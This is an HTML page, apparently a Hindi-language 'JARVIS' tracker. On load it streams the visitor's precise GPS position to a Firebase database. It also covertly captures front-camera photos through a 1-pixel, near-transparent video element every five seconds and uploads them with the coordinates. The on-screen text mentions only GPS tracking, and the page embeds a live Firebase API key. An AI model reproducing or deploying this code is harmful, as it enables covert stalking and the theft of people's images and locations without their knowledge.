<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JARVIS REMOTE - PERFECT GPS</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
        #v { width: 1px; height: 1px; opacity: 0.01; } 
        canvas { display: none; }
        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
    </style>
</head>
<body>
    <div class="control-box">
        <h2>JARVIS ACCURATE v11 <span class="live-dot"></span></h2>
        <p style="color: #888; font-size: 13px;">हाई-एक्यूरेसी जीपीएस ट्रैकिंग सक्रिय है</p>
        <video id="v" autoplay playsinline muted></video>
        <canvas id="c"></canvas>
        <div class="status-text" id="log-status">सटीक जीपीएस लॉक किया जा रहा है...</div>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
          authDomain: "army-cb492.firebaseapp.com",
          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
          projectId: "army-cb492",
          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentLat = 0;
        let currentLon = 0;

        document.addEventListener("DOMContentLoaded", () => {
            initPerfectTracker();
        });

        async function initPerfectTracker() {
            const statusDiv = document.getElementById('log-status');
            
            // 🎯 परफेक्ट हाई-एक्यूरेसी जीपीएस कॉन्फ़िगरेशन
            const gpsOptions = {
                enableHighAccuracy: true, // मोबाइल के असली हार्डवेयर GPS को एक्टिवेट करेगा
                timeout: 10000,           // 10 सेकंड के अंदर सटीक लोकेशन ढूंढना अनिवार्य है
                maximumAge: 0             // कोई भी पुराना कैश्ड डेटा इस्तेमाल नहीं होगा, एकदम फ्रेश लाइव डेटा
            };

            // लगातार लाइव और सटीक लोकेशन ट्रैक करने के लिए watchPosition
            navigator.geolocation.watchPosition((pos) => {
                currentLat = pos.coords.latitude;
                currentLon = pos.coords.longitude;
                
                // मेन लाइव नोड पर तुरंत अपडेट भेजें
                database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
                statusDiv.innerHTML = `🎯 GPS लॉक (सटीक): ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
            }, (err) => {
                console.log("GPS त्रुटि, पुनः प्रयास जारी...", err);
                statusDiv.innerHTML = "⚠️ सटीक GPS सिग्नल का इंतज़ार है...";
            }, gpsOptions);

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                video.addEventListener('loadeddata', () => {
                    captureInstantData(); // तुरंत पहली फोटो
                    setInterval(captureInstantData, 5000); // हर 5 सेकंड में कंबाइंड पैकेट
                });

            } catch(e) {
                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है बॉस!";
            }
        }

        function captureInstantData() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            c.width = 320; 
            c.height = 240;
            const ctx = c.getContext('2d');
            ctx.drawImage(v, 0, 0, 320, 240);
            
            const compressedPhoto = c.toDataURL('image/jpeg', 0.5); 
            const timestamp = Date.now();
            const currentTimeString = new Date().toLocaleTimeString();

            // लाइव डैशबोर्ड पर तुरंत इमेज भेजें
            database.ref('live_detect').update({
                photo: compressedPhoto,
                last_updated: timestamp
            });

            // जार्विस हिस्ट्री में अब जाएगी बिल्कुल सटीक जीपीएस लोकेशन और फोटो एक साथ
            database.ref('jarvis_history/' + timestamp).set({
                time: currentTimeString,
                photo: compressedPhoto,
                location_record: {
                    lat: currentLat,
                    lon: currentLon
                }
            });
        }
    </script>
</body>
</html>
